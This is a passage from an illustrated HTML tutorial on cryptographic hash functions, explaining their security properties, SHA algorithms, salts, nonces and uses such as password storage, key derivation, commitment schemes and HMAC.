        <tspan x="39.783" y="25.65"><tspan>Input</tspan> of</tspan><tspan x="39.783" y="47.65">any size</tspan>
    </text>
    <rect x="183.726" y="0" width="93.642" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="230.546" y="25.65"><tspan>Output</tspan> of</tspan><tspan x="230.546" y="47.65">fixed size</tspan>
    </text>

</svg>

    <figcaption>

Cryptographic hash functions are efficient to compute and infeasible to invert.
For the same hash function, the same input always maps to the same output.
The output is also called <a href="https://en.wikipedia.org/wiki/Image_(mathematics)">image</a>
and the corresponding input its <a href="https://en.wikipedia.org/wiki/Image_(mathematics)#Inverse_image">preimage</a>.

</figcaption>
  </figure>

  <p>The output of a hash function is called the hash of the input.
As a verb, hashing refers to applying the hash function to an input.
More formally, cryptographic hash functions have to fulfill the
<a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function#Properties">following properties</a>.
(A function which maps arbitrary inputs to fixed-sized outputs without fulfilling these properties
is just a <a href="https://en.wikipedia.org/wiki/Hash_function">hash function</a>.
In this article, I always mean the former, though.)</p>

  <ul>
    <li><strong>Preimage resistance</strong> (also known as <a href="https://en.wikipedia.org/wiki/One-way_function">one-way function</a>):
It’s infeasible to find an input which hashes to a given output.</li>
  </ul>

  <figure>
    <svg id="figure-hash-preimage" data-name="hash-preimage" width="277.067" height="42" viewBox="-1.25 -1.25 277.067 42" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="117.846" y1="19.75" x2="155.783" y2="19.75" marker-end="url(#arrow)" stroke-dasharray="31"></line>
    <rect x="0" y="0" width="117.533" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="58.767" y="25.65"><tspan>Find input</tspan></tspan>
    </text>
    <rect x="157.033" y="0" width="117.533" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="215.8" y="25.65"><tspan>Given output</tspan></tspan>
    </text>

</svg>

    <figcaption>
In these graphics, the given values are displayed in blue and the values to find in green.
</figcaption>
  </figure>

  <ul>
    <li><strong>Second-preimage resistance</strong>:
It’s infeasible to find a different input which hashes to the same output as a given input.</li>
  </ul>

  <figure>
    <svg id="figure-hash-second-preimage" data-name="hash-second-preimage" width="280.326" height="121" viewBox="-1.25 -1.25 280.326 121" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="119.475" y1="98.75" x2="157.413" y2="59.25" marker-end="url(#arrow)" stroke-dasharray="48"></line>
    <line x1="119.475" y1="19.75" x2="157.413" y2="59.25" marker-end="url(#arrow)" stroke-dasharray="48"></line>
    <rect x="0" y="0" width="119.163" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="59.581" y="25.65"><tspan>Given input 1</tspan></tspan>
    </text>
    <rect x="0" y="79" width="119.163" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="59.581" y="104.65"><tspan>Find input 2</tspan></tspan>
    </text>
    <rect x="158.663" y="39.5" width="119.163" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="218.244" y="65.15"><tspan>Same output</tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="59.581" y="68.15"><tspan>≠</tspan></tspan>
    </text>

</svg>

    <figcaption>
Knowing one input may not be useful to find another input which hashes to the same output.
</figcaption>
  </figure>

  <ul>
    <li><strong>Collision resistance</strong>:
It’s infeasible to find two different inputs which hash to the same output,
resulting in a <a href="https://en.wikipedia.org/wiki/Collision_(computer_science)">collision</a>.</li>
  </ul>

  <figure>
    <svg id="figure-hash-collision" data-name="hash-collision" width="259.309" height="121" viewBox="-1.25 -1.25 259.309 121" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="108.967" y1="98.75" x2="146.904" y2="59.25" marker-end="url(#arrow)" stroke-dasharray="48"></line>
    <line x1="108.967" y1="19.75" x2="146.904" y2="59.25" marker-end="url(#arrow)" stroke-dasharray="48"></line>
    <rect x="0" y="0" width="108.654" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="54.327" y="25.65"><tspan>Find input 1</tspan></tspan>
    </text>
    <rect x="0" y="79" width="108.654" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="54.327" y="104.65"><tspan>Find input 2</tspan></tspan>
    </text>
    <rect x="148.154" y="39.5" width="108.654" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="202.482" y="65.15"><tspan>Same output</tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="54.327" y="68.15"><tspan>≠</tspan></tspan>
    </text>

</svg>

    <figcaption>
Due to the <a href="https://en.wikipedia.org/wiki/Birthday_problem">birthday paradox</a>
and <a href="https://en.wikipedia.org/wiki/Birthday_attack">attack</a>,
this is a stronger requirement than the previous one.
</figcaption>
  </figure>

  <p>Since hash functions map an infinite number of inputs to a finite number of outputs,
they have to produce an infinite number of collisions.
The point of cryptographic hash functions is not that they don’t have any collisions,
it just has to be infeasible to find them.
In practice, cryptographic hash functions should also satisfy the
<a href="https://en.wikipedia.org/wiki/Avalanche_effect">avalanche criterion</a>:
A small change in the input changes the output completely and unpredictably.
A cryptographic hash function is said to be broken
if a preimage or a collision can be found more efficiently
than with a <a href="https://en.wikipedia.org/wiki/Brute-force_search">brute-force search</a>
or if the size of the output is so small that
a brute-force search becomes feasible with modern computers.</p>

  <p>Regarding notation,
I will use <code>:</code> to <a href="https://en.wikipedia.org/wiki/Assignment_(computer_science)">assign</a>
a value on the right to a variable on the left in the following boxes.
For example, a hash function is then written as <code>Output: hash(Input)</code>.
Sometimes, several values need to be combined into one before hashing.
I’ll use <code>+</code> to <a href="https://en.wikipedia.org/wiki/Concatenation">concatenate</a>
several values in a secure way: <code>Output: hash(Input1 + Input2)</code>.
When implementing this, you can use a special character
which may not occur in any of the values as a <a href="https://en.wikipedia.org/wiki/Delimiter">delimiter</a>
so that <code>hash(&#34;a&#34; + &#34;bc&#34;) ≠ hash(&#34;ab&#34; + &#34;c&#34;)</code>.
The <a href="https://en.wikipedia.org/wiki/Null_character">null character</a>
is used for this purpose in the case of <a href="#user-authentication"><code>PLAIN</code> authentication</a>.</p>

  <p>The term “hash” is <a href="https://en.wikipedia.org/wiki/Hash_function#History">most likely</a>
borrowed from the kitchen, where it means to chop and mix ingredients when preparing food.</p>

</details>

<details>
  <summary id="secure-hash-algorithms">
Secure Hash Algorithms (<abbr title="Secure Hash Algorithm">SHA</abbr>)
</summary>

  <p>The <a href="https://en.wikipedia.org/wiki/National_Institute_of_Standards_and_Technology">National Institute of Standards and Technology (<abbr title="National Institute of Standards and Technology by the U.S. Department of Commerce">NIST</abbr>)</a>
standardizes cryptographic hash functions under the name
<a href="https://en.wikipedia.org/wiki/Secure_Hash_Algorithms">Secure Hash Algorithms (<abbr title="Secure Hash Algorithm">SHA</abbr>)</a>.
<abbr title="National Institute of Standards and Technology by the U.S. Department of Commerce">NIST</abbr> published several Secure Hash Algorithms so far:
<a href="https://en.wikipedia.org/wiki/SHA-1"><abbr title="Secure Hash Algorithm">SHA</abbr>-1</a> in 1995,
<a href="https://en.wikipedia.org/wiki/SHA-2"><abbr title="Secure Hash Algorithm">SHA</abbr>-2</a> in 2001,
and <a href="https://en.wikipedia.org/wiki/SHA-3"><abbr title="Secure Hash Algorithm">SHA</abbr>-3</a> in 2015.
The most commonly used cryptographic hash function is <code>SHA-256</code>.
You can try it and other hash functions with this tool:</p>

  

  <p>The three digits at the end of some algorithm names indicate the size of the output in bits.
<code>SHA-256</code>, for example, hashes inputs of arbitrary size to 256 bits.
<code>SHA-224</code>, <code>SHA-256</code>, <code>SHA-384</code>, and <code>SHA-512</code> belong to the <code>SHA-2</code> family of hash functions.
Collisions have been found for <code>MD5</code> and <code>SHA-1</code>,
which hash to 128 and 160 bits respectively.
These algorithms should no longer be used.</p>

</details>

<details>
  <summary id="salts-against-pooled-brute-force-attacks">
Salts against pooled brute-force attacks
</summary>

  <p>The one-way property of cryptographic hash functions doesn’t prevent an attacker
from <a href="https://en.wikipedia.org/wiki/Brute-force_search">generating and testing</a> possible inputs.
If the set of possible (or likely) inputs is small enough,
it can be searched exhaustively to find the preimage of a given hash.
If you try to find the preimage of many hashes,
you have to compute the hash of possible inputs only once.
If you want to find further preimages in the future,
you can store the computed input-output pairs in a reverse lookup table.
Instead of trying all possible inputs again,
which can take a long time,
you simply look up the hash to crack in the output column of your precomputed table.
Since computers have limited memory,
this approach works only for a limited number of inputs.
You can enumerate all possible inputs up to a certain length
or choose them from a <a href="https://en.wikipedia.org/wiki/Dictionary_attack">dictionary</a>.
You can reduce the amount of required memory by accepting longer lookup times.
This is known as a <a href="https://en.wikipedia.org/wiki/Space%E2%80%93time_tradeoff">space-time tradeoff</a>
and is achieved with so-called <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow tables</a>.</p>

  <p>Searching for the preimage of many hashes at once can be prevented
by adding a random value to each input and storing this value together with the output.
While an attacker can still generate and test possible inputs,
they have to spend the required effort on each hash separately.
The additional input value is called <a href="https://en.wikipedia.org/wiki/Salt_(cryptography)">salt</a>.
In order to have the intended effect, the salt has to be chosen at random for each input
and should be as long as the output size of the used hash function.</p>

  <p>Why is the random value called salt?
<a href="https://stackoverflow.com/questions/244903/why-is-a-password-salt-called-a-salt">No one really knows.</a>
When cooking, salt is something you add to your ingredients before mixing them.
With enough salt, you can make food unenjoyable.
<a href="https://en.wikipedia.org/wiki/Salting_the_earth">Salting the earth</a>
is also a historic practice to make land less hospitable for your enemy.
We also say to take something with a grain of salt.
Whatever the origin may be, the term fits well.</p>

</details>

<details>
  <summary id="nonces-against-replay-attacks">
Nonces against replay attacks
</summary>

  <p>When designing a <a href="https://en.wikipedia.org/wiki/Cryptographic_protocol">cryptographic protocol</a>,
you not only want to ensure that an attacker cannot produce certain messages,
you also want to ensure that an attacker cannot record such messages
and reuse them at a later point against one of the legitimate parties.
Such <a href="https://en.wikipedia.org/wiki/Replay_attack">replay attacks</a>
are prevented by including a number which may be used only once,
which is abbreviated to <a href="https://en.wikipedia.org/wiki/Cryptographic_nonce">nonce</a>.
The replay of messages needs to be prevented both within a session and across sessions.
The former is typically accomplished with a counter:
A message is accepted if its counter is higher than the previous counter.
The latter is usually achieved by using a random number for the duration of a session
so that no information has to be persisted across sessions.
Instead of including a session-specific value in each message,
choosing some of the cryptographic keys randomly for each session has the same effect.
When the uniqueness is incorporated into temporary keys,
we no longer speak of nonces but rather of <a href="https://en.wikipedia.org/wiki/Ephemeral_key">ephemeral keys</a>.
Unlike salts, which stay the same throughout the lifetime of a hash and need to be stored,
nonces and ephemeral keys can be thrown away after use.
Besides preventing replay attacks,
mixing some uniqueness into every message has the desirable side effect of preventing an attacker
from learning when the same underlying value is sent again by one of the parties.</p>

</details>

<details>
  <summary id="applications-of-cryptographic-hash-functions">
Applications of cryptographic hash functions
</summary>

  <p>Before moving on to authentication mechanisms,
I first want to mention <a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function#Applications">some applications</a>
of cryptographic hash functions:</p>

  <ul>
    <li><a href="https://en.wikipedia.org/wiki/File_verification"><strong>Data integrity</strong></a>:
Due to their collision resistance, cryptographic hash functions produce a unique
<a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint</a> of the data which was fed into them.
In other words, the hash of a file uniquely identifies the file.
As long as you get the short hash from a trusted source,
the large file can be downloaded from an untrusted source
because you can detect potentially malicious changes to the file
by computing the hash of the file and comparing it with the trusted hash.
You can compute the <a href="#secure-hash-algorithms"><abbr title="Secure Hash Algorithm">SHA</abbr>-256</a> hash of a file with <code>openssl sha256 /path/to/file</code>.
Eliminating trust in the storage provider is really useful for
<a href="https://en.wikipedia.org/wiki/Content_delivery_network">content delivery networks (<abbr title="Content Delivery Network">CDN</abbr>)</a>,
which you might have encountered as <a href="https://en.wikipedia.org/wiki/Mirror_site">mirror sites</a>
or as <a href="https://en.wikipedia.org/wiki/Subresource_Integrity">subresource integrity (<abbr title="Sub-Resource Integrity">SRI</abbr>)</a> on the Web.
This fingerprint property is also used for <a href="https://en.wikipedia.org/wiki/Digital_signature">digital signatures</a>,
where you sign the hash of a message rather than the message.</li>
  </ul>

  <figure>
    <svg id="figure-applications-data-integrity" data-name="applications-data-integrity" width="363.133" height="187" viewBox="-1.25 -124.25 363.133 187" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="85.653" y1="30.75" x2="209.43" y2="30.75" marker-end="url(#arrow-green)" stroke-dasharray="117"></line>
    <text text-anchor="middle">
        <tspan x="148.01" y="54.25">Hash</tspan>
    </text>
    <line x1="148.01" y1="-61.187" x2="209.43" y2="30.75" marker-end="url(#arrow-blue)" stroke-dasharray="104"></line>
    <text text-anchor="start">
        <tspan x="188.959" y="-21.495">File</tspan>
    </text>
    <line x1="85.653" y1="30.75" x2="148.01" y2="-60.25" marker-end="url(#arrow-blue)" stroke-dasharray="103"></line>
    <text text-anchor="end">
        <tspan x="107.197" y="-21.92">File</tspan>
    </text>
    <rect x="0" y="0" width="85.34" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="42.67" y="25.65"><tspan>Content</tspan></tspan><tspan x="42.67" y="47.65"><tspan>producer</tspan></tspan>
    </text>
    <rect x="105.34" y="-123" width="85.34" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="148.01" y="-97.35"><tspan>Storage</tspan></tspan><tspan x="148.01" y="-75.35"><tspan>provider</tspan></tspan>
    </text>
    <rect x="210.68" y="0" width="149.953" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="285.657" y="25.65"><tspan>Consumer</tspan></tspan><tspan x="285.657" y="47.65"><tspan>hash(File) = Hash?</tspan></tspan>
    </text>

</svg>

    <figcaption>
As long as you get the hash from a trusted source,
the delivery of the file can be outsourced to an untrusted third party.
</figcaption>
  </figure>

  <ul>
    <li><a href="https://en.wikipedia.org/wiki/Password_cracking"><strong>Password protection</strong></a>:
In order to verify whether a user provided the correct password,
a server doesn’t have to store the password of the user.
The server can simply store a <a href="#salts-against-pooled-brute-force-attacks">salted hash</a> of the password
and then check whether the user provided the same password as before by computing and comparing its hash.
The advantage of this approach is that an attacker who compromised the database
cannot log in as the user as they don’t know the preimage of the salted hash.</li>
  </ul>

  <figure>
    <svg id="figure-applications-password-protection" data-name="applications-password-protection" width="620.425" height="64" viewBox="-1.25 -1.25 620.425 64" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="515.996" y1="30.75" x2="412.374" y2="30.75" marker-end="url(#arrow-blue)" stroke-dasharray="97"></line>
    <text text-anchor="middle">
        <tspan x="463.716" y="18.75">Salt, Hash</tspan>
    </text>
    <line x1="72.361" y1="30.75" x2="175.119" y2="30.75" marker-end="url(#arrow-blue)" stroke-dasharray="96"></line>
    <text text-anchor="middle">
        <tspan x="124.209" y="18.75">Password</tspan>
    </text>
    <rect x="0" y="0" width="72.049" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="36.024" y="25.65"><tspan>Client</tspan></tspan><tspan x="36.024" y="47.65">of user</tspan>
    </text>
    <rect x="176.369" y="0" width="234.754" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="293.746" y="25.65"><tspan>Server</tspan> of provider</tspan><tspan x="293.746" y="47.65"><tspan>hash(Password + Salt) = Hash?</tspan></tspan>
    </text>
    <rect x="516.308" y="0" width="101.617" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="567.117" y="25.65"><tspan>Database</tspan></tspan><tspan x="567.117" y="47.65">of provider</tspan>
    </text>

</svg>

    <figcaption>
A server can reduce the damage of a leaked database by storing individually salted hashes instead of passwords.
</figcaption>
  </figure>

  <ul>
    <li><a href="https://en.wikipedia.org/wiki/Key_derivation_function"><strong>Key derivation</strong></a>:
Cryptographic hash functions are designed to run as fast as possible.
While good performance is desirable for many applications,
it’s not desirable when hashing passwords.
Even if the hash of a password is salted,
an attacker can still perform a <a href="https://en.wikipedia.org/wiki/Brute-force_attack">brute-force attack</a>
to find an input which hashes to the given output with the given salt.
In order to make such attacks costlier,
passwords are often hashed thousands of times instead of just once.
Repeated hashing means that you take the output of one round as the input to the next round.
This also makes the computation costlier for the legitimate parties
but unlike an attacker, they have to compute the derivation only once per session.
Making a weak <a href="https://en.wikipedia.org/wiki/Key_(cryptography)">key</a>
more secure against brute-force attacks by increasing the cost
is called <a href="https://en.wikipedia.org/wiki/Key_stretching">key stretching</a>.
One algorithm for doing so is the
<a href="https://en.wikipedia.org/wiki/PBKDF2">Password-Based Key Derivation Function 2 (<abbr title="Password-Based Key Derivation Function 2">PBKDF2</abbr>)</a>,
which is specified in <a href="https://datatracker.ietf.org/doc/html/rfc8018"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8018</a>.
Additionally, cryptographic keys typically have a desired length,
which is another reason for using a key derivation function (<abbr title="Key Derivation Function">KDF</abbr>).</li>
  </ul>

  <figure>
    <svg id="figure-applications-key-derivation" data-name="applications-key-derivation" width="368.581" height="103.85" viewBox="-1.25 -5 368.581 103.85" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <circle cx="151.955" cy="58.675" r="38.925"></circle>
    <text text-anchor="middle">
        <tspan x="151.955" y="53.575"><tspan>Repeated</tspan></tspan><tspan x="151.955" y="75.575"><tspan>hashing</tspan></tspan>
    </text>
    <line x1="93.88" y1="19.75" x2="209.092" y2="19.75" marker-end="url(#arrow-blue)" stroke-dasharray="108"></line>
    <text text-anchor="middle">
        <tspan x="151.955" y="7.75"><tspan>pbkdf</tspan></tspan>
    </text>
    <rect x="0" y="0" width="93.567" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="46.784" y="25.65"><tspan>Password</tspan></tspan>
    </text>
    <rect x="210.342" y="0" width="155.738" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="288.212" y="25.65"><tspan>Cryptographic key</tspan></tspan>
    </text>

</svg>

    <figcaption>
By hashing an input repeatedly, you can turn an efficient hash function into an inefficient one.
</figcaption>
  </figure>

  <ul>
    <li><a href="https://en.wikipedia.org/wiki/Random_seed"><strong>Independent values</strong></a>:
Another use case of cryptographic hash functions is
to generate a sequence of unrelatable values from a single source value.
Such a source value is called a <a href="https://en.wikipedia.org/wiki/Random_seed">seed</a>
because a <a href="https://en.wikipedia.org/wiki/Tree_(data_structure)">tree</a> of values can grow from it.
The seed is then hashed with a counter or a <a href="https://en.wikipedia.org/wiki/Timestamp">timestamp</a>.
As long as the seed remains secret,
others cannot compute the next value from the previous one and vice versa.
Hash functions are used for this purpose in
<a href="https://en.wikipedia.org/wiki/COVID-19_apps">contact tracing apps</a>,
<a href="https://en.wikipedia.org/wiki/Cryptocurrency_wallet">cryptocurrency wallets</a>,
and <a href="https://en.wikipedia.org/wiki/One-time_password">one-time passwords (<abbr title="One-Time Passwords">OTP</abbr>)</a>.
If a hash function fulfills the <a href="https://en.wikipedia.org/wiki/Avalanche_effect#Strict_avalanche_criterion">strict avalanche criterion</a>,
it can even be used as a <a href="https://en.wikipedia.org/wiki/Pseudorandom_number_generator">pseudo-random number generator (<abbr title="Pseudo-Random Number Generator">PRNG</abbr>)</a>
or as a <a href="https://en.wikipedia.org/wiki/Block_cipher">block cipher</a> for encryption.
For all these use cases, the seed has to be chosen randomly,
which means it has to have enough <a href="https://en.wikipedia.org/wiki/Entropy_(information_theory)">entropy</a>.
If you don’t like <a href="https://en.wikipedia.org/wiki/Password_manager">password managers</a>,
you can use hash functions to generate site-specific passwords as <code>SitePassword: hash(LoginDomain + MasterPassword)</code>.
Unless you know exactly what you’re doing,
I advise you not to use this technique as there are many pitfalls,
such as leaving your password in the <a href="https://en.wikipedia.org/wiki/Command_history">command history</a>
or accidentally including newline characters, but it’s certainly a neat idea.
(The order of <code>LoginDomain</code> and <code>MasterPassword</code> is important as you might be vulnerable to a
<a href="https://en.wikipedia.org/wiki/Length_extension_attack">length-extension attack</a> otherwise, see below.)</li>
  </ul>

  <figure>
    <svg id="figure-applications-independent-values" data-name="applications-independent-values" width="303.783" height="181" viewBox="-1.25 -70.75 303.783 181" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="210.05" y1="40.75" x2="210.05" y2="68.25" marker-start="url(#arrow-red)" marker-end="url(#arrow-red)" stroke-dasharray="14" stroke-dashoffset="21"></line>
    <line x1="210.05" y1="-28.75" x2="210.05" y2="-1.25" marker-start="url(#arrow-red)" marker-end="url(#arrow-red)" stroke-dasharray="14" stroke-dashoffset="21"></line>
    <line x1="59.129" y1="19.75" x2="117.566" y2="89.25" marker-end="url(#arrow-green)" stroke-dasharray="84"></line>
    <line x1="59.129" y1="19.75" x2="117.566" y2="19.75" marker-end="url(#arrow-green)" stroke-dasharray="51"></line>
    <line x1="59.129" y1="19.75" x2="117.566" y2="-49.75" marker-end="url(#arrow-green)" stroke-dasharray="84"></line>
    <rect x="0" y="0" width="58.816" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="29.408" y="25.65"><tspan>Seed</tspan></tspan>
    </text>
    <rect x="118.816" y="-69.5" width="182.467" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="210.05" y="-43.85"><tspan>Value<tspan dy="3">1</tspan><tspan dy="-3">​</tspan></tspan>: hash(1 + Seed)</tspan>
    </text>
    <rect x="118.816" y="0" width="182.467" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="210.05" y="25.65"><tspan>Value<tspan dy="3">2</tspan><tspan dy="-3">​</tspan></tspan>: hash(2 + Seed)</tspan>
    </text>
    <rect x="118.816" y="69.5" width="182.467" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="210.05" y="95.15"><tspan>Value<tspan dy="3">X</tspan><tspan dy="-3">​</tspan></tspan>: hash(X + Seed)</tspan>
    </text>

</svg>

    <figcaption>
Values can easily be derived from a seed (in green)
but they cannot be related to one another (in red).
</figcaption>
  </figure>

  <ul>
    <li><a href="https://en.wikipedia.org/wiki/Commitment_scheme"><strong>Commitment schemes</strong></a>:
A commitment scheme allows you to commit yourself to a value
while keeping the value secret until you reveal it later.
You can think of it as giving a locked box to a recipient
while providing the key to open the box only later.
A commitment scheme has to be both
<a href="https://en.wikipedia.org/wiki/Commitment_scheme#Defining_the_security">binding and hiding</a>:
The committer may not be able to change the committed value
and the recipient may not be able to figure out the committed value.
In order to understand why this is useful,
let’s look at an example <a href="https://en.wikipedia.org/wiki/Commitment_scheme#Coin_flipping">from Wikipedia</a>.
Suppose Alice and Bob need to resolve a dispute over the Internet.
If they were at the same place, they could simply
<a href="https://en.wikipedia.org/wiki/Coin_flipping">flip a coin</a>.
Since they are remote, one would have to trust the other to report the flip correctly.
As neither of them is willing to trust the other, they come up with the following procedure.
Alice flips a coin and hashes the outcome with a random <a href="#nonces-against-replay-attacks">nonce</a>.
She then sends the output to Bob, who replies with the outcome of his own coin flip.
Finally, Alice reveals her commitment by sending her coin flip and nonce to Bob.
By verifying whether the flip and the nonce hash to the value he received earlier,
Bob can detect if Alice attempted to cheat.
Alice and Bob agreed that if their coin flips are the same, then Alice wins. If not, Bob wins.
If the hash function is secure, neither of them can skew the result in their favor.</li>
  </ul>

  <figure>
    <svg id="figure-applications-commitment-scheme" data-name="applications-commitment-scheme" width="302.06600000000003" height="181.25" viewBox="-31.033 -1.25 302.06600000000003 181.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <polyline points="241.25,165.5 266.25,165.5 266.25,81.5 241.25,81.5" marker-end="url(#arrow-pink)" stroke-dasharray="127"></polyline>
    <text text-anchor="middle">
        <tspan x="253.75" y="129.4"><tspan>?</tspan></tspan>
    </text>
    <g>
        <rect x="-29.783" y="0" width="59.566" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="0" y="25.65"><tspan>Alice</tspan></tspan>
        </text>
        <line x1="0" y1="40.75" x2="0" y2="178.75"></line>
    </g>
    <g>
        <rect x="210.217" y="0" width="59.566" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="240" y="25.65"><tspan>Bob</tspan></tspan>
        </text>
        <line x1="240" y1="40.75" x2="240" y2="178.75"></line>
    </g>
    <g>
        <line x1="0" y1="81.5" x2="238.75" y2="81.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="232"></line>
        <text text-anchor="middle">
            <tspan x="119.375" y="69.5">hash(CoinFlipAlice + Nonce)</tspan>
        </text>
    </g>
    <g>
        <line x1="240" y1="123.5" x2="1.25" y2="123.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="232"></line>
        <text text-anchor="middle">
            <tspan x="120.625" y="111.5">CoinFlipBob</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="165.5" x2="238.75" y2="165.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="232"></line>
        <text text-anchor="middle">
            <tspan x="119.375" y="153.5">CoinFlipAlice, Nonce</tspan>
        </text>
    </g>

</svg>

    <figcaption>
If <code>CoinFlipAlice = CoinFlipBob</code>, Alice wins.
If <code>CoinFlipAlice ≠ CoinFlipBob</code>, Bob wins.
</figcaption>
  </figure>

  <ul>
    <li><a href="https://en.wikipedia.org/wiki/Message_authentication"><strong>Message authentication</strong></a>:
How can two parties be sure that no one tampered with their communication?
They can achieve this by extending each message with a value
which depends on the message and which only they can generate.
Such a value is called a
<a href="https://en.wikipedia.org/wiki/Message_authentication_code">message authentication code (<abbr title="Message Authentication Code">MAC</abbr>)</a>.
If an attacker modifies a message, the original <abbr title="Message Authentication Code">MAC</abbr> no longer matches the message
and the attacker cannot fix this because they cannot generate a valid <abbr title="Message Authentication Code">MAC</abbr>.
Both parties compute the <abbr title="Message Authentication Code">MAC</abbr> for each message they receive
and reject all messages for which the transmitted <abbr title="Message Authentication Code">MAC</abbr> is different from the computed <abbr title="Message Authentication Code">MAC</abbr>.
One way of implementing message authentication codes is to hash the message together with a value
which is known only to the legitimate parties.
This value is a <a href="https://en.wikipedia.org/wiki/Shared_secret">shared secret</a>
and it is used as a <a href="https://en.wikipedia.org/wiki/Key_(cryptography)">cryptographic key</a>.
For example, the <abbr title="Message Authentication Code">MAC</abbr> could be computed as <code>hash(Key + Message)</code>.
Unfortunately, this isn’t secure when used with any of the
<a href="#secure-hash-algorithms">hash functions listed above</a> as they are all vulnerable
to <a href="https://en.wikipedia.org/wiki/Length_extension_attack">length-extension attacks</a>.
The problem is that these algorithms leak their internal state as the result,
so an attacker can simply continue where the legitimate party left off
without having to know the shared key.
This means that, given a <code>Message</code> and the corresponding <abbr title="Message Authentication Code">MAC</abbr>,
an attacker can generate a valid <abbr title="Message Authentication Code">MAC</abbr> for the message <code>Message + MaliciousAddition</code>.
While swapping the key and the message solves this problem,
<code>hash(Message + Key)</code> makes the <abbr title="Message Authentication Code">MAC</abbr> immediately vulnerable
as soon as the hash function becomes vulnerable to
<a href="https://en.wikipedia.org/wiki/Collision_attack">collision attacks</a>.
In order to avoid such issues, cryptographers came up with the
<a href="https://en.wikipedia.org/wiki/HMAC">Hash-based Message Authentication Code (<abbr title="Hash-based Message Authentication Code">HMAC</abbr>)</a> in 1996,
which is defined as follows:
<code>hmac(Key, Message) = hash([Key&#39; ⊕ OuterPadding] + hash([Key&#39; ⊕ InnerPadding] + Message))</code>,
where the <code>⊕</code> denotes the <a href="#exclusive-or-operation-for-perfect-encryption">bitwise exclusive-or operation</a>
and the square brackets are used only to make the parenthesis matching easier.
The paddings are the same for everyone and their purpose is to make the key in the inner hash
different from the key in the outer hash.
If the key is longer than the <a href="https://en.wikipedia.org/wiki/Block_size_(cryptography)">block size</a>
of the used hash function, it needs to be hashed: <code>Key&#39; = hash(Key)</code>.
Not always hashing the key leads to <a href="https://en.wikipedia.org/wiki/PBKDF2#HMAC_collisions">trivial collisions</a>,
which should have been avoided when specifying the algorithm.
As long as you understand what <abbr title="Hash-based Message Authentication Code">HMAC</abbr> is good for, the details don’t matter here.
The <a href="#secure-hash-algorithms"><abbr title="Secure Hash Algorithm">SHA</abbr>-3 algorithms</a> aren’t susceptible to length-extension attacks
and my understanding is that the much simpler <code>hash(Key + Message)</code> construction works as intended with them.
What is important to note is that hash-based message authentication codes are symmetric:
Whoever can verify them can also generate them.
Unlike <a href="https://en.wikipedia.org/wiki/Digital_signature">digital signatures</a>,
message authentication codes allow a party to <a href="https://en.wikipedia.org/wiki/Non-repudiation">repudiate</a>
messages which it <a href="https://en.wikipedia.org/wiki/Deniable_authentication">authenticated</a>
because the other party could have generated the corresponding <abbr title="Message Authentication Code">MAC</abbr> as well.</li>
  </ul>

  <figure>
    <svg id="figure-applications-message-authentication" data-name="applications-message-authentication" width="423.682" height="139.25" viewBox="-36.841 -1.25 423.682 139.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <g>
        <rect x="-35.591" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="0" y="25.65"><tspan>Client</tspan></tspan>
        </text>
        <line x1="0" y1="40.75" x2="0" y2="136.75"></line>
    </g>
    <g>
        <rect x="314.409" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="350" y="25.65"><tspan>Server</tspan></tspan>
        </text>
